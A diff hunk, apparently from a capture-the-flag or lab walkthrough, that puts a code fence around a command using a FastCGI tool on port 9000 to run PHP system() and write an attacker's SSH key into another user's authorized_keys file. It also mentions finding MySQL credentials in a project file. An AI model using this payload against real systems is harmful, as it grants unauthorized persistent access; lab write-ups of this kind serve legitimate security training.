@@ -1727,9 +1727,10 @@ mysql       1169  0.0  2.6 1542260 104776 ?      Ssl  Feb26   0:20 /usr/sbin/mar
 * Create new ssh keys and we add it to Victor authorized keys 
 * Access via ssh with our new generated key and we get to user account
 
-
-fmp.py -c "<?= system('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM0NcvJ3VEgkrgQUhNKa/O1hrflzWZLwPJH58E2phA3kYOx...................axlhxxPKB+vgESESBikvtGtY9LzbsRgs5l+L7eV4tRrs8KU+vSdMwZz7WOyJxv15o6U4EClH2sfVRgCG/hlabBAc5tcJ45pX483rbxO6aYNQbO8Zwqq3wJMYSs/41sbsCE9IGWG9464mMYlokd/ikQxPYa9..........................................m/w02GzkcZ+yQ/....................................................................n/i0W9uI8MjLsw+6RLQ01wE3vdvOixZg.............................................HyM9YheE= user@-VirtualBox > /home/mac/.ssh/authorized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
+```
+fmp`.py -c "<?= system('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM0NcvJ3VEgkrgQUhNKa/O1hrflzWZLwPJH58E2phA3kYOx...................axlhxxPKB+vgESESBikvtGtY9LzbsRgs5l+L7eV4tRrs8KU+vSdMwZz7WOyJxv15o6U4EClH2sfVRgCG/hlabBAc5tcJ45pX483rbxO6aYNQbO8Zwqq3wJMYSs/41sbsCE9IGWG9464mMYlokd/ikQxPYa9..........................................m/w02GzkcZ+yQ/....................................................................n/i0W9uI8MjLsw+6RLQ01wE3vdvOixZg.............................................HyM9YheE= user@-VirtualBox > /home/mac/.ssh/authorized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
 <orized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
+```
 
 
 Found MySql database credentials on the file models/db.js
